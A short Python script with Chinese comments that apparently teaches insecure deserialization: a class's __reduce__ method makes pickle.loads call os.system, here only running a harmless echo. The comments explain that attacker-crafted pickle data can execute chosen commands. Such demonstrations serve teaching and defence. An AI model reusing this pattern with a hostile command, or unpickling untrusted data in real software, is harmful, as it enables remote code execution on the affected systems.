import os
import pickle


class Evil:
        # __reduce__() 可以指定反序列化时调用什么函数及其参数
        # 如果攻击者能够构造恶意 Pickle 数据，反序列化就可能执行攻击者指定的操作
        def __reduce__(self):
                return (os.system, ('echo PICKLE_RCE',))


if __name__ == '__main__':
        data = pickle.dumps(Evil())
        pickle.loads(data)  # Dangerous!!
